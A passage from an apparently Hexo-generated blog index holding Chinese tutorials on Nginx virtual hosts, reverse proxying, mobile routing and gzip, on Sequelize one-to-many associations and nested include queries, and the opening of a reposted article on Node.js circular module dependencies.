class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  # 匹配端口为 8001 的请求</span><br><span class="line">  listen 8001;</span><br><span class="line">  root /var/www/html/8001;</span><br><span class="line">  index index.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建好如上的配置后，重启 Nginx 服务器，那么在 8001 端口也会被启用，起读取文件的根目录为 <code>/var/www/html/8001</code>。</p><p>当我们访问 <code>localhost:8001</code> 时：</p><p><img src="http://study.esunr.xyz/1583502962306.png" alt=""></p><h2 id="5-2-基于域名的配置方案"><a href="#5-2-基于域名的配置方案" class="headerlink" title="5.2 基于域名的配置方案"></a>5.2 基于域名的配置方案</h2><p>Nginx 服务默认运行在 80 端口，这个端口也是用户访问一个域名的默认端口号，所以最好不要向用户暴露端口号。Nginx 在接收用户请求时可以检查用户的 Host 字段，可以得知用户访问的域名是什么，于是我们就可以根据此项配置来将用户引导直不同的服务。</p><p>在配置文件中，可以设置 <code>server_name</code> 来配置不同域名的访问情况下，所读取的文件目录，以开头的例子为演示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 请求会根据配置自动匹配</span><br><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line">  server_name app1.esunr.xyz;</span><br><span class="line">  root /var/www/html/app1;</span><br><span class="line">  index index.html</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line">  server_name app2.esunr.xyz;</span><br><span class="line">  root /var/www/html/app2;</span><br><span class="line">  index index.html</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，当用访问 <code>app1.esunr.xyz</code> 时，就会返回服务器端的 <code>/var/www/html/app1/index.html</code>。当用户访问 <code>app2.esunr.xyz</code> 时，就会返回服务器端的 <code>/var/www/html/app2/index.html</code>。</p><h1 id="6-反向代理"><a href="#6-反向代理" class="headerlink" title="6. 反向代理"></a>6. 反向代理</h1><p>Nginx 拥有强大的反向代理功能，可以作为反向代理服务器使用。</p><blockquote><p>正向代理时代理客户端的请求，将多个客户端的请求转发到一台主机上，如 SSR 技术。</p><p>反向代理时代理服务器，一个用户访问代理服务器后，请求有可能被转发到多个服务器上，因此可被用作于负载均衡。</p></blockquote><p>我们可以做一个演示，当用户访问我们的域名时，我们利用 Nginx 的反向代理，将请求转发至 <code>https://www.baidu.com</code> 上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line">  server_name test2.localhost.com;</span><br><span class="line">  location / &#123;</span><br><span class="line">    proxy_pass https://www.baidu.com;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，请求的域名并没有改变，但是实际的网页内容已经被替换为百度的内容：</p><p><img src="http://study.esunr.xyz/1583505904004.png" alt=""></p><h1 id="7-PC-端于移动端的适配"><a href="#7-PC-端于移动端的适配" class="headerlink" title="7. PC 端于移动端的适配"></a>7. PC 端于移动端的适配</h1><p>对于现阶段的移动端适配方案，通常有两种，分别为基于媒体查询器自适应网页，还有就是编写两套 web 端的页面。针对于第二种方案，Nginx 可以通过判断用户的访问设备类型，来自动返回给用户 PC 端的页面与移动端的页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line">  server_name test.localhost.com;</span><br><span class="line">  # 匹配根目录</span><br><span class="line">  location / &#123;</span><br><span class="line">    root /var/www/html/test.localhost.com;</span><br><span class="line">    # 如果时移动端设备，就返回移动端网页</span><br><span class="line">    if ($http_user_agent ~* &#x27;Android|webOS|iPhone|iPod|BlackBerry&#x27;) &#123;</span><br><span class="line">      root /var/www/html/mobile;</span><br><span class="line">    &#125;</span><br><span class="line">    index index.html;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://study.esunr.xyz/1583507504263.png" alt="移动端访问效果"></p><h1 id="8-Gzip-压缩"><a href="#8-Gzip-压缩" class="headerlink" title="8. Gzip 压缩"></a>8. Gzip 压缩</h1><p>gzip是需要服务器和浏览器同事支持的。当浏览器支持gzip压缩时，会在请求消息中包含Accept-Encoding:gzip,这样Nginx就会向浏览器发送听过gzip后的内容，同时在相应信息头中加入Content-Encoding:gzip，声明这是gzip后的内容，告知浏览器要先解压后才能解析输出。</p><p><strong>gzip的配置项</strong></p><p>Nginx提供了专门的gzip模块，并且模块中的指令非常丰富。</p><ul><li>gzip : 该指令用于开启或 关闭gzip模块。</li><li>gzip_buffers : 设置系统获取几个单位的缓存用于存储gzip的压缩结果数据流。</li><li>gzip_comp_level : gzip压缩比，压缩级别是1-9，1的压缩级别最低，9的压缩级别最高。压缩级别越高压缩率越大，压缩时间越长。</li><li>gzip_disable : 可以通过该指令对一些特定的User-Agent不使用压缩功能。</li><li>gzip_min_length:设置允许压缩的页面最小字节数，页面字节数从相应消息头的Content-length中进行获取。</li><li>gzip_http_version：识别HTTP协议版本，其值可以是1.1.或1.0.</li><li>gzip_proxied : 用于设置启用或禁用从代理服务器上收到相应内容gzip压缩。</li><li>gzip_vary : 用于在响应消息头中添加Vary：Accept-Encoding,使代理服务器根据请求头中的Accept-Encoding识别是否启用gzip压缩。</li></ul><p><strong>gzip最简单的配置</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">   .....</span><br><span class="line">    gzip on;</span><br><span class="line">    gzip_types text/plain application/javascript text/css;</span><br><span class="line">   .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gzip on</code>是启用gizp模块，下面的一行是用于在客户端访问网页时，对文本、JavaScript 和CSS文件进行压缩输出。</p><p>配置好后，我们就可以重启Nginx服务，让我们的gizp生效了。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 快速使用 </tag>
            
            <tag> Nginx </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sequelize 一对多关系及多表的级（tao）联（wa）查询</title>
      <link href="/2020/02/5eab32cbcdda.html"/>
      <url>/2020/02/5eab32cbcdda.html</url>
      
        <content type="html"><![CDATA[<h1 id="Sequelize-建立一对多关系"><a href="#Sequelize-建立一对多关系" class="headerlink" title="Sequelize 建立一对多关系"></a>Sequelize 建立一对多关系</h1><p>首先我们假设这么一个场景：</p><p>在一个宿舍管理系统种，Building 表记录了宿舍楼的信息，Floor 表记录了宿舍楼层的信息，Room 表记录了宿舍房间的信息，CleanRecord 表记录了房间的打扫信息。其中 CleanRecord 表通过 roomId 关联 Room 表，Room 通过 floorId 关联 Floor 表，Floor 通过 buildingId 关联 Building 表，其可视化关系表现如下。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200221132951.png" alt=""></p><p>以 Building 与 Floor 为例，一栋宿舍楼种又多个楼层，所以宿舍楼与楼层之间是 1:n 的关系，而对于一个楼层来说，它只归属于一栋宿舍楼，所以楼层于宿舍楼之间是 1:1 的关系。我们也可以依次得出 Record 于 Room 之间的关系，Room 与 Floor 之间的关系。</p><p>我们利用 Sequelize 依次建立各个表的 Model：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">Model</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;sequelize&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Record</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Model</span> &#123;&#125;</span><br><span class="line"><span class="title class_">Record</span>.<span class="title function_">init</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">time</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">DataTypes</span>.<span class="property">DATE</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">sequelize</span>: db.<span class="property">sequelize</span>,</span><br><span class="line">    <span class="attr">modelName</span>: <span class="string">&quot;Record&quot;</span>,</span><br><span class="line">    <span class="attr">paranoid</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Record</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Model</span> &#123;&#125;</span><br><span class="line"><span class="title class_">Record</span>.<span class="title function_">init</span>(</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">number</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">DataTypes</span>.<span class="property">INTEGER</span>,</span><br><span class="line">      <span class="attr">comment</span>: <span class="string">&quot;房间号&quot;</span>,</span><br><span class="line">      <span class="attr">unique</span>: <span class="string">&quot;compositeIndex&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">sequelize</span>: db.<span class="property">sequelize</span>,</span><br><span class="line">    <span class="attr">modelName</span>: <span class="string">&quot;cleanRecord&quot;</span>,</span><br><span class="line">    <span class="attr">paranoid</span>: <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">)</span><br><span class="line"><span class="comment">// ... ... 省略建立 Floor 与 Building ... ...</span></span><br></pre></td></tr></table></figure><p>之后我们要为各个表之间进行关联，才可以在系统种创建该表。对于一对多关系，sequelize 在 Model 上存在 <code>hasMany()</code> 方法与 <code>belongsTo()</code> 方法，分别是在<strong>目标</strong>上建立外键与在<strong>源</strong>上建立外键，根据我们设计好的关系，我们建立如下连接：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Building</span>.<span class="title function_">hasMany</span>(<span class="title class_">Floor</span>)</span><br><span class="line"><span class="title class_">Floor</span>.<span class="title function_">hasMany</span>(<span class="title class_">Room</span>)</span><br><span class="line"><span class="title class_">Room</span>.<span class="title function_">hasMany</span>(<span class="title class_">Record</span>)</span><br></pre></td></tr></table></figure><p>这样一对多关系就建立好了，在每个一对多 (1:n) 关系种，1 的一方的 Model 实例上都挂载了相应的 get 方法与 set 方法，可以调用归属于其下的子数据，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> room = <span class="keyword">await</span> <span class="title class_">Room</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">where</span>: &#123;<span class="attr">id</span>: <span class="number">1</span>&#125; &#125;)</span><br><span class="line"><span class="keyword">let</span> records = <span class="keyword">await</span> room.<span class="title function_">getRecords</span>() <span class="comment">// 获取 id 为 1 的房间下的所有记录</span></span><br></pre></td></tr></table></figure><p>虽然这样建立了 Building 与 Floor 的关系，并可以通过 Building 查询到相应的 Floor 列表，但是 Floor 与 Building 之间并未建立起关系，我们无法通过 Floor 找到对应的 Building，其他的表也是如此。这是因为我们仅仅建立了一组单向的关系，要想让双方都可以查找到彼此，那么必须建立一个双向关系。</p><p>通过前面的分析，Floor 与 Building 之间、Room 与 Floor 之间、Record 与 Room 之间都是 1:1 的关系，对于一对多关系，sequelize 在 Model 上存在 <code>belongsTo()</code> 与 <code>hasOne()</code> 方法，分别是在<strong>源</strong>上建立外键与在<strong>目标</strong>上建立外键。根据我们设计好的关系，我们再来进行 1:1 关系的关联：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Floor</span>.<span class="title function_">belongsTo</span>(<span class="title class_">Building</span>)</span><br><span class="line"><span class="title class_">Room</span>.<span class="title function_">belongsTo</span>(<span class="title class_">Floor</span>)</span><br><span class="line"><span class="title class_">Record</span>.<span class="title function_">belongsTo</span>(<span class="title class_">Room</span>)</span><br></pre></td></tr></table></figure><p>同时，其源模型的实例上也创建了相应的 get 与 set 方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> room = <span class="keyword">await</span> <span class="title class_">Room</span>.<span class="title function_">findOne</span>(&#123; <span class="attr">where</span>: &#123;<span class="attr">id</span>: <span class="number">1</span>&#125; &#125;)</span><br><span class="line"><span class="keyword">const</span> floor = <span class="keyword">await</span> room.<span class="title function_">getFloor</span>() <span class="comment">// 获取 room 归属的楼层</span></span><br></pre></td></tr></table></figure><h1 id="2-级联查询"><a href="#2-级联查询" class="headerlink" title="2. 级联查询"></a>2. 级联查询</h1><p>在上述关系下，我们可以使用级联查询来连接各个表，用到了查询的 <code>include</code> 选项，比如我们要查找 Rocrd 与 Room 信息的完整数据：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> records = <span class="keyword">await</span> <span class="title class_">Record</span>.<span class="title function_">findAll</span>(&#123; <span class="attr">include</span>: [&#123;<span class="attr">model</span>: <span class="title class_">Room</span>&#125;] &#125;)</span><br></pre></td></tr></table></figure><p>那么在每条记录下就会产生一个 room 字段来存放房间相关的信息，records 的值为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">time</span>: <span class="string">&quot;xxxx-xx-xx&quot;</span>,</span><br><span class="line">    <span class="attr">roomId</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">room</span>: &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">nnumber</span>: <span class="number">101</span>,</span><br><span class="line">      <span class="attr">floorId</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><code>include</code> 种还可以嵌套 <code>include</code>，形成 <code>A表连接（B表连接C表）</code> 的效果，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> records = <span class="keyword">await</span> <span class="title class_">Record</span>.<span class="title function_">findAll</span>(&#123; </span><br><span class="line">  <span class="attr">include</span>: [&#123;</span><br><span class="line">    <span class="attr">model</span>: <span class="title class_">Room</span>,</span><br><span class="line">    <span class="attr">include</span>: [&#123;</span><br><span class="line">      <span class="attr">model</span>: <span class="title class_">Floor</span>,</span><br><span class="line">      <span class="attr">include</span>: [&#123;</span><br><span class="line">        <span class="attr">model</span>: <span class="title class_">Building</span></span><br><span class="line">      &#125;]</span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;] </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这样查询的结果就十分套娃了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">time</span>: <span class="string">&quot;xxxx-xx-xx&quot;</span>,</span><br><span class="line">    <span class="attr">roomId</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">room</span>: &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">number</span>: <span class="number">101</span>,</span><br><span class="line">      <span class="attr">floorId</span>: <span class="number">1</span>,</span><br><span class="line">      <span class="attr">floor</span>: &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">layer</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">buildingId</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">building</span>: &#123;</span><br><span class="line">          <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">          <span class="attr">name</span>: <span class="string">&quot;于心苑&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>多表联合查询也可以过滤条件，假如我们想通过多表连接的方式查找某个 id 为 2 房间的所有打扫记录，那么在 <code>include</code> 添加 <code>where</code> 条件也可以过滤出结果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> records = <span class="keyword">await</span> <span class="title class_">Record</span>.<span class="title function_">findAll</span>(&#123; </span><br><span class="line">  <span class="attr">include</span>: [&#123;</span><br><span class="line">    <span class="attr">model</span>: <span class="title class_">Room</span>,</span><br><span class="line">    <span class="attr">where</span>: &#123;<span class="attr">id</span>: <span class="number">1</span>&#125;  </span><br><span class="line">  &#125;]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>相当于直接使用 rooms.getRecords()</p></blockquote><p>那么如果我们想查找某层楼的所有宿舍的打扫记录应该如何查（tao）找（wa）呢？那就是在嵌套的 include 中添加 where 条件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> records = <span class="keyword">await</span> <span class="title class_">Record</span>.<span class="title function_">findAll</span>(&#123; </span><br><span class="line">  <span class="attr">include</span>: [&#123;</span><br><span class="line">    <span class="attr">model</span>: <span class="title class_">Room</span>,</span><br><span class="line">    <span class="attr">include</span>: [&#123;</span><br><span class="line">      <span class="attr">model</span>: <span class="title class_">Floor</span>,</span><br><span class="line">      <span class="attr">where</span>: &#123; <span class="attr">id</span>: <span class="number">2</span> &#125;</span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;] </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>但是这样查找却会发现结果如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">time</span>: <span class="string">&quot;xxxx-xx-xx&quot;</span>,</span><br><span class="line">    <span class="attr">roomId</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">room</span>: <span class="literal">null</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">time</span>: <span class="string">&quot;xxxx-xx-xx&quot;</span>,</span><br><span class="line">    <span class="attr">roomId</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">room</span>: &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">      <span class="attr">nnumber</span>: <span class="number">202</span>,</span><br><span class="line">      <span class="attr">floorId</span>: <span class="number">2</span>,</span><br><span class="line">      <span class="attr">floor</span>: &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">layer</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">buildingId</span>: <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>我们发现不符合条件的结果也别查出来了，但是 room 字段是 null。我们来分析一下当前执行连接查询的方式是：<strong>Record 连接查询 (Room 连接查询 Floor)</strong>，也就是 (A &amp; (B &amp; C))。执行查询过程中是 Room 连接查询 Floor 后生成的新表再与 Record 表进行连接查询。我们只过滤了 Room 表连接查询 Floor 表的结果，但为过滤生成的新表与 Record 表的结果，所以会产生一个空记录。</p><p>我们将查询语句中添加一个判断连接的新表的 roomId 不能为 null：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> records = <span class="keyword">await</span> <span class="title class_">Record</span>.<span class="title function_">findAll</span>(&#123; </span><br><span class="line">  <span class="attr">include</span>: [&#123;</span><br><span class="line">    <span class="attr">model</span>: <span class="title class_">Room</span>,</span><br><span class="line">    <span class="attr">where</span>: &#123; <span class="attr">id</span>: &#123; [<span class="title class_">Op</span>.<span class="property">isNot</span>]: <span class="literal">null</span> &#125; &#125;,</span><br><span class="line">    <span class="attr">include</span>: [&#123;</span><br><span class="line">      <span class="attr">model</span>: <span class="title class_">Floor</span>,</span><br><span class="line">      <span class="attr">where</span>: &#123; <span class="attr">id</span>: <span class="number">2</span> &#125;</span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;] </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这下查询结果就正常：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">time</span>: <span class="string">&quot;xxxx-xx-xx&quot;</span>,</span><br><span class="line">    <span class="attr">roomId</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">room</span>: &#123;</span><br><span class="line">      <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">      <span class="attr">nnumber</span>: <span class="number">202</span>,</span><br><span class="line">      <span class="attr">floorId</span>: <span class="number">2</span>,</span><br><span class="line">      <span class="attr">floor</span>: &#123;</span><br><span class="line">        <span class="attr">id</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">layer</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">buildingId</span>: <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sequelize </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs中模块间的循环引用[转载]</title>
      <link href="/2020/02/c37064ac6406.html"/>
      <url>/2020/02/c37064ac6406.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文：<a href="http://maples7.com/2016/08/17/cyclic-dependencies-in-node-and-its-solution/">http://maples7.com/2016/08/17/cyclic-dependencies-in-node-and-its-solution/</a></p></blockquote><p>Node.js 开发一般不容易遇到真正的模块循环依赖的情况，可是当你的项目开始达到一定的复杂度之后，你很有可能在你的 Node.js 编码生涯中遇到几次。而且如果你之前没有关于这方面的意识，Debug 可能会花费不少的时间。</p><p>我在最近的项目中就遇到了这种情况，而且不能轻易通过项目架构的重构来解决。具体来说，A 文件中需要用 B 文件中某些函数，B 文件又需要用到 A 文件中的某些函数。</p><h3 id="定义问题"><a href="#定义问题" class="headerlink" title="定义问题"></a><a href="#定义问题" title="定义问题"></a>定义问题</h3><p>实际上，Node.js 官网上就有<a href="https://nodejs.org/api/modules.html#modules_cycles">关于模块循环 <code>require()</code> 的说明</a>。</p><p>在官网给出的例子中，有 3 个模块：<code>main.js</code>、<code>a.js</code>、<code>b.js</code>。其中 <code>main.js</code> 有对 <code>a.js</code> 和 <code>b.js</code> 的引用，而 <code>a.js</code> 和 <code>b.js</code> 又是相互引用的关系（详细情况请参阅上段末的超链接）。</p><p>官网上点出了这种模块循环的情况，并且解释清楚了原因（但并没有给出具体可行的解决方案）：</p><blockquote><p>When <code>main.js</code> loads <code>a.js</code>, then <code>a.js</code> in turn loads <code>b.js</code>. At that point, <code>b.js</code> tries to load <code>a.js</code>. In order to prevent an infinite loop, an <strong>unfinished copy</strong> of the <code>a.js</code> exports object is returned to the <code>b.js</code> module. <code>b.js</code> then finishes loading, and its exports object is provided to the <code>a.js</code> module.</p></blockquote><p>简单说就是，为了防止模块载入的死循环，Node.js 在模块第一次载入后会把它的结果进行缓存，下一次再对它进行载入的时候会直接从缓存中取出结果。所以在这种循环依赖情形下，不会有死循环，但是却会因为缓存造成模块没有按照我们预想的那样被导出（export，详细的案例分析见下文）。</p><p>官网给出了三个模块还不是循环依赖最简单的情形。实际上，两个模块就可以很清楚的表达出这种情况。根据递归的思想，解决了最简单的情形，这一类任意大小规模的问题也就解决了一半（另一半还需要探明随着问题规模增长，问题的解将会如何变化）。</p><p>下面是一个两个模块循环依赖的问题最简情形：</p><p><code>A.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> b = <span class="built_in">require</span>(<span class="string">&#x27;./B&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;A: before logging b&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;A: after logging b&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">A</span>: <span class="string">&#x27;this is a Object&#x27;</span></span><br><span 